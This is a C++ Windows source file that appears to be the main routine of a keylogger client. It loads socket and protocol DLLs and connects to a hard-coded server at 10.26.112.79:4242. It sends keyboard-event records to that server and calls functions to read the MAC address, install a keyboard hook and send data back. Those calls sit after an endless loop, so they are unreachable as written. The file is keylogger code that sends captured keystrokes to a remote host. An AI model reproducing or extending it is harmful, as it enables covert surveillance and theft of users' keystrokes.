#include <windows.h>
#include <iostream>
#include "Client.h"
#include "../../include/lib/ITime.hpp"
#include "../../include/lib/ISocket.hpp"
#include "../../include/lib/IProtocol.hpp"

Client clt;

int main(int ac, char **av)
{
	HMODULE time = LoadLibrary("Time_Windows.dll");
	if (time == NULL)
		return (2);
	fct_new_itime new_time = (fct_new_itime)GetProcAddress(time, NAME_FCT_NEW_ITIME);
	if (new_time == NULL)
		return (1);
	ITime &lol = new_time();
	HMODULE socket = LoadLibrary("Socket_Windows.dll");
	if (socket == NULL)
		return (2);
	fct_iselect	iselect = (fct_iselect)GetProcAddress(socket, NAME_FCT_ISELECT);
	if (iselect == NULL)
	{
		std::cout << GetLastError() << std::endl;
		getchar();
		return (5);
	}
	fct_new_iclient new_client = (fct_new_iclient)GetProcAddress(socket, NAME_FCT_NEW_ICLIENT);
	if (new_client == NULL)
		return (1);
	ISocket &xd = new_client("10.26.112.79", "4242");
	HMODULE protocol = LoadLibrary("protocolv1.dll");
	if (protocol == NULL)
		return (2);
	fct_new_iprotocol new_protocol = (fct_new_iprotocol)GetProcAddress(protocol, NAME_FCT_NEW_IPROTOCOL);
	if (new_protocol == NULL)
		return (4);
	IProtocol &mdr = new_protocol(xd, lol);

	IProtocol::Keyboard	keyboard = {lol, "press", "ff", "rio.exe" };
	std::list<IProtocol::Keyboard *>	ptdr;
	ptdr.push_back(&keyboard);
	mdr.keyboard(ptdr);
	while (true)
	{
		mdr.select();
		iselect(nullptr);
		if (mdr.run() == true)
			return (0);
	}
	clt.getMACAddress();

	clt.setKeyboardHook();
	clt.sendBackMessage();
	return (0);
}